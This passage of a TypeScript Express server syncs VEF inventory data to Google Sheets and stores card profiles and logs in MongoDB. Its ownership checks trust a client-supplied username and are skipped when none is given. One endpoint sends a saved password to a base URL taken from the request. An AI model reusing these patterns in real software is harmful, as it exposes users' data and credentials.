    return res.status(404).json({ success: false, message: "Card profile tidak ditemukan." });
  }

  const reqUser = (
    (req.headers["x-vef-username"] as string) ||
    (req.query.username as string) ||
    (req.body?.ownerUsername as string) ||
    ""
  ).trim();

  if (profile.ownerUsername && reqUser && profile.ownerUsername.toLowerCase() !== reqUser.toLowerCase()) {
    return res.status(403).json({
      success: false,
      message: "Akses ditolak: Anda hanya dapat mengubah jadwal card milik Anda sendiri.",
    });
  }

  profile.scheduleTimes = normalizeScheduleTimes(profile.scheduleTimes);
  profile.scheduleEnabled = !profile.scheduleEnabled;
  profile.updatedAt = new Date().toISOString();

  const nextRun = calculateNextRunTime(profile.scheduleTimes, profile.timezone);
  profile.nextRunTimestamp = nextRun.nextRunTimestamp;
  profile.nextRunTimeStr = nextRun.nextRunTimeStr;

  // Update in MongoDB
  upsertProfileToDB(profile).catch((err) =>
    console.error("[MongoDB Profile Toggle Error]:", err)
  );

  return res.json({
    success: true,
    message: profile.scheduleEnabled
      ? `Jadwal otomatis untuk "${profile.name}" diaktifkan pada jam: ${profile.scheduleTimes.join(", ")} WIB (${profile.nextRunTimeStr}).`
      : `Jadwal otomatis untuk "${profile.name}" dinonaktifkan.`,
    profile,
  });
});

// Execute export for a specific card
app.post("/api/profiles/:id/export", async (req, res) => {
  const { id } = req.params;
  const profile = sheetProfiles.find((p) => p.id === id);
  if (!profile) {
    return res.status(404).json({ success: false, message: "Card profile tidak ditemukan." });
  }

  const reqUser = (
    (req.headers["x-vef-username"] as string) ||
    (req.query.username as string) ||
    (req.body?.ownerUsername as string) ||
    ""
  ).trim();

  if (profile.ownerUsername && reqUser && profile.ownerUsername.toLowerCase() !== reqUser.toLowerCase()) {
    return res.status(403).json({
      success: false,
      message: "Akses ditolak: Anda hanya dapat mengekspor card milik Anda sendiri.",
    });
  }

  try {
    const result = await runProfileSync(profile, true);
    return res.json({
      success: true,
      message: `Berhasil mengekspor ${result?.rowCount || 0} baris ke [${profile.sheetName}] untuk card "${profile.name}"!`,
      rowCount: result?.rowCount,
      durationMs: result?.durationMs,
      log: result?.log,
      profile,
      sheetData: result?.sheetData,
      previewRows: result?.previewRows,
      headers: result?.headers,
    });
  } catch (error: any) {
    return res.status(500).json({
      success: false,
      message: error.message || "Gagal melakukan ekspor data.",
    });
  }
});

// Fetch preview data for a specific card
app.post("/api/profiles/:id/preview", async (req, res) => {
  const { id } = req.params;
  const profile = sheetProfiles.find((p) => p.id === id);
  if (!profile) {
    return res.status(404).json({ success: false, message: "Card profile tidak ditemukan." });
  }

  const reqUser = (
    (req.headers["x-vef-username"] as string) ||
    (req.query.username as string) ||
    (req.body?.ownerUsername as string) ||
    ""
  ).trim();

  if (profile.ownerUsername && reqUser && profile.ownerUsername.toLowerCase() !== reqUser.toLowerCase()) {
    return res.status(403).json({
      success: false,
      message: "Akses ditolak: Anda hanya dapat melihat pratinjau card milik Anda sendiri.",
    });
  }

  try {
    const creds = getUserCredentials(profile.ownerUsername) || savedVefCredentials;
    if (!creds || !creds.username) {
      return res.status(400).json({
        success: false,
        message: "Silakan login ke akun VEF terlebih dahulu.",
      });
    }

    const pullResult = await fetchVefItemSummary({
      username: creds.username,
      password: creds.password,
      cookie: creds.cookie,
      baseUrl: profile.vefBaseUrl || "https://dgi.vef-solution.com",
      company: profile.company || "DG Group",
      sumAllWarehouses: profile.sumAllWarehouses ?? 1,
    });

    if (pullResult.cookie) {
      creds.cookie = pullResult.cookie;
      if (profile.ownerUsername && userSessions.has(profile.ownerUsername)) {
        userSessions.get(profile.ownerUsername)!.cookie = pullResult.cookie;
      }
      if (savedVefCredentials.username === creds.username) {
        savedVefCredentials.cookie = pullResult.cookie;
      }
    }

    return res.json({
      success: true,
      count: pullResult.totalRows,
      headers: pullResult.headers,
      columns: pullResult.columns,
      previewRows: pullResult.formattedObjects.slice(0, 50),
      totalRows: pullResult.totalRows,
      sheetData: pullResult.sheetData,
    });
  } catch (error: any) {
    return res.status(500).json({
      success: false,
      message: error.message || "Gagal mengambil pratinjau data dari VEF.",
    });
  }
});

// 3. Backward-compatible endpoints
app.post("/api/vef/item-summary", async (req, res) => {
  try {
    const { username, password, cookie, baseUrl, company, sumAllWarehouses } = req.body;
    const effectiveUser = username || savedVefCredentials.username;
    const effectivePass = password || savedVefCredentials.password;
    const effectiveCookie = cookie || savedVefCredentials.cookie;

    if (!effectiveUser) {
      return res.status(400).json({ success: false, message: "Username VEF diperlukan." });
    }

    const result = await fetchVefItemSummary({
      username: effectiveUser,
      password: effectivePass,
      cookie: effectiveCookie,
      baseUrl: baseUrl || "https://dgi.vef-solution.com",
      company: company || "DG Group",
      sumAllWarehouses: sumAllWarehouses ?? 1,
    });

    if (effectiveUser && effectivePass) {
      savedVefCredentials.username = effectiveUser;
      savedVefCredentials.password = effectivePass;
      if (result.cookie) savedVefCredentials.cookie = result.cookie;
    }

    return res.json({
      success: true,
      count: result.totalRows,
      headers: result.headers,
      columns: result.columns,
      previewRows: result.formattedObjects.slice(0, 50),
      totalRows: result.totalRows,
      sheetData: result.sheetData,
    });
  } catch (error: any) {
    return res.status(500).json({
      success: false,
      message: error.message || "Gagal menarik data Item Summary dari VEF.",
    });
  }
});

app.post("/api/export/google-sheet", async (req, res) => {
  const startTime = Date.now();
  try {
    const { spreadsheetId, sheetName = "Item Summary", startCell = "A1", sheetData, appsScriptUrl, googleAccessToken } =
      req.body;

    if (!sheetData || !Array.isArray(sheetData) || sheetData.length === 0) {
      return res.status(400).json({ success: false, message: "Data untuk diekspor kosong." });
    }

    await exportToGoogleSheet({
      spreadsheetId,
      sheetName,
      startCell,
      sheetData,
      appsScriptUrl,
      googleAccessToken,
    });

    const duration = Date.now() - startTime;
    const rowCount = sheetData.length - 1;

    const log: SyncLog = {
      id: `manual-${Date.now()}`,
      timestamp: new Date().toISOString(),
      type: "manual",
      status: "success",
      message: `Berhasil mengekspor ${rowCount} baris ke Google Sheet [${sheetName}]!`,
      rowCount,
      durationMs: duration,
    };
    syncLogs.unshift(log);

    return res.json({
      success: true,
      message: log.message,
      rowCount,
      durationMs: duration,
      log,
    });
  } catch (error: any) {
    const duration = Date.now() - startTime;
    const log: SyncLog = {
      id: `manual-err-${Date.now()}`,
      timestamp: new Date().toISOString(),
      type: "manual",
      status: "error",
      message: error.message || "Gagal mengekspor data ke Google Sheets.",
      durationMs: duration,
    };
    syncLogs.unshift(log);

    return res.status(500).json({
      success: false,
      message: error.message,
      log,
    });
  }
});

// Logs Endpoint - isolated per user
app.get("/api/sync-logs", (req, res) => {
  const reqUser = ((req.query.username as string) || (req.headers["x-vef-username"] as string) || "").trim();
  if (!reqUser) {
    return res.json({ logs: [] });
  }
  const filtered = syncLogs.filter(
    (l) => !l.ownerUsername || l.ownerUsername.toLowerCase() === reqUser.toLowerCase()
  );
  return res.json({ logs: filtered });
});

app.post("/api/sync-logs/clear", async (req, res) => {
  const reqUser = (
    (req.body?.username as string) ||
    (req.query.username as string) ||
    (req.headers["x-vef-username"] as string) ||
    ""
  ).trim();

  if (reqUser) {
    syncLogs = syncLogs.filter(
      (l) => l.ownerUsername && l.ownerUsername.toLowerCase() !== reqUser.toLowerCase()
    );
  } else {
    syncLogs = [];
  }
  await clearSyncLogsFromDB();
  res.json({ success: true, message: "Riwayat log telah dibersihkan." });
});

// MongoDB Status & Monitored Users Endpoints
app.get("/api/mongodb/status", (req, res) => {
  const status = getMongoStatus();
  return res.json(status);
});

app.post("/api/mongodb/reconnect", async (req, res) => {
  console.log("[MongoDB] Manual reconnect triggered by user...");
  const connected = await connectMongoDB();
  if (connected) {
    // Reload profiles and logs from DB
    const dbProfiles = await fetchAllProfilesFromDB();
    if (dbProfiles && dbProfiles.length > 0) {
      sheetProfiles = dbProfiles;
    } else if (dbProfiles && dbProfiles.length === 0 && sheetProfiles.length > 0) {
      for (const p of sheetProfiles) {
        await upsertProfileToDB(p);
      }
    }
    const dbLogs = await fetchSyncLogsFromDB(100);
    if (dbLogs && dbLogs.length > 0) {
      syncLogs = dbLogs;
    }
  }
  return res.json(getMongoStatus());
});

app.get("/api/mongodb/users", async (req, res) => {
  try {
    const users = await fetchMonitoredUsersFromDB();
    return res.json({ success: true, users });
  } catch (err: any) {
    return res.status(500).json({ success: false, message: err.message, users: [] });
  }
});

// Explicit API catch-all to prevent Vite HTML fallback from serving HTML for /api/* requests
app.all("/api/*", (req, res) => {
  res.status(404).json({
    success: false,
    message: `API endpoint ${req.method} ${req.originalUrl} tidak ditemukan.`,
  });
});

// Start Server with Vite Middleware
async function startServer() {
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://0.0.0.0:${PORT}`);

    // Connect to MongoDB Atlas asynchronously without blocking HTTP listener
    (async () => {
      try {
        console.log("[MongoDB] Menginisialisasi koneksi MongoDB Atlas...");
        const mongoOk = await connectMongoDB();
        if (mongoOk) {
          // Synchronize card profiles
          const dbProfiles = await fetchAllProfilesFromDB();
          if (dbProfiles && dbProfiles.length > 0) {
            console.log(`[MongoDB] Memuat ${dbProfiles.length} card target dari database.`);
            sheetProfiles = dbProfiles;
          } else if (dbProfiles && dbProfiles.length === 0 && sheetProfiles.length > 0) {
            console.log("[MongoDB] Menyimpan template card awal ke database...");
            for (const p of sheetProfiles) {
              await upsertProfileToDB(p);
            }
          }

          // Synchronize sync logs
          const dbLogs = await fetchSyncLogsFromDB(100);
          if (dbLogs && dbLogs.length > 0) {
            syncLogs = dbLogs;
          }
        }
        startMongoKeepAlive();
      } catch (mErr) {
        console.warn("[MongoDB Startup Warning]:", mErr);
      }
    })();
  });
}

// Export Express app for Vercel Serverless Functions
export { app };
export default app;

// Only start standalone HTTP listener in non-Vercel environments (Local dev, Docker, Cloud Run)
if (!process.env.VERCEL) {
  startServer();
}
